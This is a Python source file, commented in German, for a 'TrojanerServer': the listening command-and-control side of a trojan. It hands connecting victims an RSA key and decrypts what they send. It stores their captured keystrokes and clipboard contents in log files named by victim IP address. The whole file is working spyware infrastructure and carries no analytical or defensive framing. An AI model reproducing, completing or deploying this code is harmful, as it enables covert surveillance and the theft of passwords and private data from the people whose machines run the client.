import socket
from threading import Thread
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization


class TrojanerServer():
    def __init__(self, host="0.0.0.0" , server_port = 49155):
        # Variablen
        self.host = host
        self.server_port = server_port
        self.BUFSIZ = 2048
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.server_port))
        self.clients = {}
        self.addresses = {}
        self.private_key, self.public_key = self.generate_key_pair()

        try:
            self.server_socket.listen(5)
            print("Waiting for connection...")
            ACCEPT_THREAD = Thread(target=self.accept_incoming_connections)
            ACCEPT_THREAD.start()
            ACCEPT_THREAD.join()
            self.server_socket.close()
        except Exception as e:
            print(f"Error: {e}")

    # RSA Verschlüsselung
    def generate_key_pair(self):
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        public_key = private_key.public_key()
        return private_key, public_key

    # RSA Verschlüsselung
    def decrypt(self, message_encrypted):
        try:
            return self.private_key.decrypt(
                message_encrypted,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            ).decode('utf-8')
        except ValueError:
            return "Failed to Decrypt"
        
    # Verbindungen annehmen
    def accept_incoming_connections(self):
        while True:
            client, client_address = self.server_socket.accept()
            self.addresses[client] = client_address
            print(f"{client_address} has connected.")
            Thread(target=self.handle_client, args=(client,)).start()
    
    # Handling von den Clients und ihrer Anfragen
    def handle_client(self, client):
        try:
            public_key_serialized = self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            client.send(public_key_serialized)

            while True:
                msg = client.recv(self.BUFSIZ)
                if not msg:
                    break  # Client hat die Verbindung getrennt
                
                decrypted_msg = self.decrypt(msg)
                if decrypted_msg is None:
                    continue  # Falls Entschlüsselung fehlschlägt
                
                client_address = self.addresses.get(client, "Unknown")

                # Ruft den Keylogger auf
                if decrypted_msg.startswith("Keylogger"):
                    decrypted_msg = decrypted_msg.removeprefix("Keylogger ")
                    self.handle_keylogger(client_address, decrypted_msg)
                # Ruft den Clipboardlogger auf
                elif decrypted_msg.startswith("Clipboard"):
                    decrypted_msg = decrypted_msg.removeprefix("Clipboard ")
                    self.handle_clipboard(client_address, decrypted_msg)

                print(f"{client_address}: {decrypted_msg}")

        except Exception as e:
            print(f"Client Handling Error: {e}")
        finally:
            print(f"Closing connection to {self.addresses.get(client, 'Unknown')}")
            client.close()
            self.addresses.pop(client, None)

    # Keylogger
    def handle_keylogger(self, client_address, decrypted_msg):
        log_file = f"{client_address}_keylogger.txt"
        try:
            if decrypted_msg == "Delete_Last":
                with open(log_file, "r+") as log:
                    content = log.readlines()
                    log.seek(0)
                    log.writelines(content[:-1])  # Entfernt die letzte Zeile
                    log.truncate()
            else:
                with open(log_file, "a") as log:
                    log.write(decrypted_msg + "\n")
        except FileNotFoundError:
            print(f"Log file {log_file} not found, creating new one.")
            with open(log_file, "w") as log:
                log.write(decrypted_msg + "\n")
        except Exception as e:
            print(f"Error writing to keylogger file {log_file}: {e}")

    # Clipboard Keylogger
    def handle_clipboard(self, client_address, decrypted_msg):
        clipboard_file = f"{client_address}_clipboard.txt"
        try:
            with open(clipboard_file, "a") as clipboard:
                clipboard.write(decrypted_msg + "\n")
        except Exception as e:
            print(f"Error writing to clipboard file {clipboard_file}: {e}")

# Script wird gestartet wenn es ausgeführt wird
if __name__ == "__main__":
    TrojanerServer()
